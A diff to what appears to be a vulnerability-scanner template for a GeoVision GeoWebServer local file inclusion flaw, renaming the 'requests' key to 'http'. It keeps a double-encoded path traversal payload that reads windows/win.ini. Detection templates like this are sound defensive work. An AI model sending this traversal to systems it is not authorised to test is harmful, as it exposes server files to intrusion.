@@ -8,7 +8,7 @@ info:
   reference: https://packetstormsecurity.com/files/163860/geovisiongws533-lfixssxsrfexec.txt
   tags: geowebserver,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini"
